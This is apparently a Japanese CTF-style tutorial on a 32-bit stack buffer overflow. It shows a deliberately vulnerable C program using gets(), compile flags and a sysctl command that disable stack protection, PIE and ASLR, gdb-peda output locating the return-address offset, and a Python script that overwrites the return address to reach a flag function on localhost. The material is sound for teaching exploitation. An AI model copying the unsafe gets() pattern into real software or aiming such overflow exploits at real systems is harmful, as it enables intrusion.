# PWNオーバーフロー入門: 関数の戻り番地を書き換える(SSP、ASLR、PIE無効で32bitELF)

## PWN対象のコード

```c:overflow02.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void flag()
{
  puts("flag is HANDAI_CTF");
  fflush(stdout);
//  sleep(1);
}

void saru()
{
  char buf[16];

  gets(buf);
}

int main(){
  saru();

  return 0;
}
```

## PWN対象のコードをコンパイル

```bash-statement
saru@lucifen:~/pwn002$ gcc -m32 -no-pie -fno-stack-protector overflow02.c -o overflow02
overflow02.c: In function ‘saru’:
overflow02.c:16:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   gets(buf);
   ^~~~
   fgets
/tmp/ccNHFUW1.o: In function `saru':
overflow02.c:(.text+0x59): warning: the `gets' function is dangerous and should not be used.
saru@lucifen:~/pwn002$
```
-m32を付けて32bitでコンパイル。

コンパイルできない場合は64bit環境で32bitのELFをコンパイルできない環境にある可能性があるのでgcc-multilibをインストール。

```bash-statement
$ sudo apt-get install gcc-multilib
```
-no-pieでPIEを無効化。

-fno-stack-protectorでSSPを無効化。

さらに

```bash-statement
$ sudo sysctl -w kernel.randomize_va_space=0
```

でASLRを無効化。
再起動の必要は無い。

## リターンアドレスを調べる

gdbで簡単に調べられる。

```bash-statement
saru@lucifen:~/pwn002$ gdb ./overflow02                                             GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./overflow02...(no debugging symbols found)...done.
gdb-peda$ p flag
$1 = {<text variable, no debug info>} 0x80484a6 <flag>
gdb-peda$ q
saru@lucifen:~/pwn002$ 
```

つまり0x080484a6。

## 書き換えるリターンアドレスの場所を調べる

startした後niでずっと進めてgetsで読み込みになった後「ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg」を入力してenter。

```bash-statement
[----------------------------------registers-----------------------------------]
EAX: 0xffffd4c0 ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg")
EBX: 0x58575655 ('UVWX')
ECX: 0xf7fc25c0 --> 0xfbad2288
EDX: 0xf7fc389c --> 0x0
ESI: 0xf7fc2000 --> 0x1d4d6c
EDI: 0x0
EBP: 0x62615a59 ('YZab')
ESP: 0xffffd4e0 --> 0xf7fe0067 (and    al,0x10)
EIP: 0x66656463 ('cdef')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x66656463
[------------------------------------stack-------------------------------------]
0000| 0xffffd4e0 --> 0xf7fe0067 (and    al,0x10)
0004| 0xffffd4e4 --> 0xffffd500 --> 0x1
0008| 0xffffd4e8 --> 0x0
0012| 0xffffd4ec --> 0xf7e05e81 (<__libc_start_main+241>:       add    esp,0x10)
0016| 0xffffd4f0 --> 0xf7fc2000 --> 0x1d4d6c
0020| 0xffffd4f4 --> 0xf7fc2000 --> 0x1d4d6c
0024| 0xffffd4f8 --> 0x0
0028| 0xffffd4fc --> 0xf7e05e81 (<__libc_start_main+241>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x66656463 in ?? ()
gdb-peda$
```

書き換えに成功してリターンアドレスが0x66656463になったことで落ちている。
つまり文字列で言うと「cdef」に書き換えられている。
つまり29～32文字目で書き換えられる。

## exploitなコード

```python:exploit02.py
import socket
import time



def main():
    buf = b'A' * 28 
    buf += b'\xa6\x84\x04\x08'
    buf += b'\n'
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("localhost", 28080))
    time.sleep(1)
    print(buf)
    sock.sendall(buf)
    s = sock.recv(100)
    print(s.decode(errors='replace'))



if __name__ == "__main__":
    main()
```

28文字Aを送った後に0xa6840408を送り付ける。

## 実行結果

```bash-statement
saru@lucifen:~/pwn002$ python exploit02.py
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa6\x84\x04\x08\n'
flag is HANDAI_CTF

saru@lucifen:~/pwn002$
```
というわけで成功！
